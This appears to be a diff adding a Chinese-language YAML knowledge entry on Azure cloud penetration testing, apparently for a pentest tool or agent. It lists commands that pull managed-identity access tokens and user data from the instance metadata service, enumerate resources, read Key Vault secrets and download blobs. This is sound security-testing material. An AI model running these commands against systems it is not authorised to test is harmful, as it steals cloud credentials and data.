@@ -1,0 +1,65 @@
+name: Azure云环境渗透
+description: Azure云环境信息收集和利用技术
+domain: cloud
+version: '1.0'
+tags:
+- cloud
+- azure
+- privilege-escalation
+knowledge: |
+  # Azure云环境渗透
+
+  ## 信息收集
+
+  ### 元数据服务
+  ```bash
+  # 获取实例元数据
+  curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+  # 获取访问令牌
+  curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+  # 获取用户数据
+  curl -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
+  ```
+
+  ### Azure CLI 枚举
+  ```bash
+  # 登录状态
+  az account show
+
+  # 列出资源组
+  az group list
+
+  # 列出虚拟机
+  az vm list
+
+  # 列出存储账户
+  az storage account list
+  ```
+
+  ## 常见攻击路径
+
+  ### 1. 托管身份滥用
+  ```bash
+  # 获取访问令牌
+  curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"
+  ```
+
+  ### 2. Key Vault 凭据泄露
+  ```bash
+  # 列出密钥保管库
+  az keyvault list
+
+  # 获取密钥
+  az keyvault secret show --vault-name vault-name --name secret-name
+  ```
+
+  ### 3. Blob 存储访问
+  ```bash
+  # 列出容器
+  az storage container list --account-name storage-account
+
+  # 下载 Blob
+  az storage blob download --account-name storage-account --container-name container --name blob-name --file local-file
+  ```
